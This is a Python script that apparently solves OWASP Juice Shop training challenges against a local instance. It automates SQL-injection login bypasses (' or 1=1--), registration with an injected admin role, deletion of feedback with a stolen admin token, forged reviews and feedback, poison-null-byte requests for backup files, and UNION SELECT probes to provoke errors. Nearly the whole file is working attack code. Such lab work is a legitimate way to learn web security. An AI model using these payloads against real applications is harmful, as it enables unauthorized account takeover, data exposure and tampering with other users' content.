#!/usr/bin/env python3
import json, sys, urllib.request, urllib.parse, urllib.error, re

BASE = "http://localhost:3000"

def req(method, path, data=None, token=None, ctype="application/json", raw=False):
    url = BASE + path
    headers = {}
    body = None
    if token: headers["Authorization"] = f"Bearer {token}"
    if data is not None:
        if isinstance(data, (bytes, str)):
            body = data.encode() if isinstance(data, str) else data
        else:
            body = json.dumps(data).encode()
        headers["Content-Type"] = ctype
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)

def j(method, path, data=None, token=None):
    st, t = req(method, path, data, token)
    try: return st, json.loads(t)
    except Exception: return st, t

def login(email, pw="x"):
    st, d = j("POST", "/rest/user/login", {"email": email, "password": pw})
    try: return d["authentication"]["token"]
    except Exception: return None

def solved():
    st, d = j("GET", "/api/Challenges/")
    return {c["name"] for c in d["data"] if c.get("solved")} if isinstance(d, dict) else set()

def status(tag):
    s = solved()
    print(f"### {tag}: {len(s)} solved")
    for n in sorted(s): print("   +", n)
    return s

log = []
def note(name, desc):
    log.append((name, desc))
    print(f"TRY {name}: {desc}")

# ---------- baseline ----------
admin_tok = login("' or 1=1--")
jim_tok = login("' or Email='jim@juice-sh.op'--")
print("admin_tok?", bool(admin_tok), "jim_tok?", bool(jim_tok))

note("Login Admin", "SQLi ' or 1=1--")
note("Login Jim", "SQLi ' or Email='jim@juice-sh.op'--")

# ---------- Confidential Document ----------
st, t = req("GET", "/ftp/acquisitions.md")
note("Confidential Document", f"GET /ftp/acquisitions.md -> {st}")

# ---------- Admin Registration ----------
st, d = j("POST", "/api/Users", {
    "email": "admin2@juice-sh.op", "password": "admin123",
    "passwordRepeat": "admin123",
    "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},
    "securityAnswer": "x", "role": "admin"})
note("Admin Registration", f"POST /api/Users role=admin -> {st} {str(d)[:200]}")

# ---------- Empty User Registration ----------
st, d = j("POST", "/api/Users", {
    "email": "", "password": "", "passwordRepeat": "",
    "securityQuestion": {"id": 1}, "securityAnswer": ""})
note("Empty User Registration", f"POST /api/Users empty -> {st} {str(d)[:200]}")

# ---------- Password Hash Leak ----------
if admin_tok:
    st, d = j("GET", "/rest/user/whoami", token=admin_tok)
    note("Password Hash Leak", f"GET /rest/user/whoami -> {st} {str(d)[:300]}")

# ---------- Admin Section ----------
if admin_tok:
    st, d = j("GET", "/rest/admin/application-version", token=admin_tok)
    note("Admin Section(app-version)", f"-> {st} {str(d)[:200]}")
    st, d = j("GET", "/api/Users", token=admin_tok)
    note("Admin Section(api/Users)", f"-> {st} {str(d)[:200]}")
    st, d = j("GET", "/rest/admin/application-configuration", token=admin_tok)
    note("Admin Section(app-config)", f"-> {st} {str(d)[:200]}")

# ---------- Five-Star Feedback : delete all 5-star feedback ----------
st, d = j("GET", "/api/Feedbacks", token=admin_tok)
if isinstance(d, dict) and "data" in d:
    five = [f for f in d["data"] if f.get("rating") == 5]
    note("Five-Star Feedback", f"found {len(five)} five-star feedbacks")
    for f in five:
        st2, d2 = j("DELETE", f"/api/Feedbacks/{f['id']}", token=admin_tok)
        note("Five-Star Feedback", f"DELETE /api/Feedbacks/{f['id']} -> {st2}")
else:
    note("Five-Star Feedback", f"GET feedbacks -> {st} {str(d)[:200]}")

# ---------- Forged Feedback : post as another user ----------
st, cap = j("GET", "/rest/captcha")
captchaId = cap.get("captchaId"); captcha = cap.get("answer") if isinstance(cap, dict) else None
if captchaId:
    st, d = j("POST", "/api/Feedbacks", {
        "comment": "forged feedback test", "rating": 3,
        "UserId": 1, "captchaId": captchaId, "captcha": captcha})
    note("Forged Feedback", f"POST /api/Feedbacks UserId=1 -> {st} {str(d)[:200]}")

# ---------- Forged Review : edit existing review ----------
st, d = j("GET", "/rest/products/1/reviews")
rev_id = None
if isinstance(d, dict) and d.get("data"):
    rev_id = d["data"][0].get("_id")
note("Forged Review", f"review id={rev_id}")
if rev_id:
    st, d = j("PUT", "/rest/products/reviews", {"id": rev_id, "message": "forged edit"})
    note("Forged Review", f"PUT /rest/products/reviews -> {st} {str(d)[:200]}")
    st, d = j("POST", "/rest/products/reviews",
              {"product": 1, "message": "forged as admin", "author": "admin@juice-sh.op"})
    note("Forged Review(post)", f"POST /rest/products/reviews -> {st} {str(d)[:200]}")

# ---------- Access Log ----------
for p in ["/support/logs/access.log", "/support/logs/access.log.2024",
          "/support/logs/access.log.2025", "/support/logs/access.log.2026"]:
    st, t = req("GET", p)
    note("Access Log", f"{p} -> {st} len={len(t)}")

# ---------- Deprecated Interface (B2B) ----------
st, d = j("GET", "/rest/b2b/v2/orders")
note("Deprecated Interface", f"GET /rest/b2b/v2/orders -> {st} {str(d)[:200]}")
st, d = j("POST", "/rest/b2b/v2/orders", {"orderLinesData": []})
note("Deprecated Interface(post)", f"POST -> {st} {str(d)[:200]}")

# ---------- Easter Egg ----------
for p in ["/ftp/eastere.gg", "/ftp/easter_egg", "/easteregg"]:
    st, t = req("GET", p)
    note("Easter Egg", f"{p} -> {st} len={len(t)}")

# ---------- Forgotten backups ----------
for p in ["/ftp/package.json.bak", "/ftp/coupons_2013.md.bak",
          "/ftp/package.json.bak%2500.md", "/ftp/coupons_2013.md.bak%2500.md",
          "/ftp/sales_backup", "/ftp/developer_backup"]:
    st, t = req("GET", p)
    note("Backup?", f"{p} -> {st} len={len(t)} {t[:60]!r}")

# ---------- Extra Language ----------
for lang in ["tlh", "tlh_AA", "klingon", "xx", "en_AA"]:
    st, t = req("GET", f"/assets/i18n/{lang}.json")
    note("Extra Language", f"{lang}.json -> {st} len={len(t)}")

# ---------- Error Handling: provoke stack trace ----------
candidates = [
    ("GET", "/rest/products/search?q='))--", None),
    ("GET", "/rest/products/search?q=%27%22%60", None),
    ("GET", "/rest/track-order/%27", None),
    ("GET", "/rest/basket/999999999", admin_tok),
    ("GET", "/rest/order-history/orders", admin_tok),
    ("POST", "/api/Feedbacks", {"comment": "x", "rating": "abc", "captchaId": 1, "captcha": "y"}),
    ("GET", "/rest/products/search?q=" + urllib.parse.quote("test' UNION SELECT null--"), None),
    ("GET", "/rest/user/login", None),
    ("GET", "/api/Users/'", admin_tok),
]
for m, p, d in candidates:
    st, t = req(m, p, d, token=admin_tok if m != "GET" or "login" not in p else None)
    hit = "stack" in t.lower() or "error" in t.lower()[:200] or "sqlite" in t.lower() or "sequelize" in t.lower()
    note("Error Handling", f"{m} {p} -> {st} len={len(t)} suspicious={hit} :: {t[:120]!r}")

status("END")
with open("/home/neilh/websec_lab/solve_log.json", "w") as f:
    json.dump(log, f, indent=1)
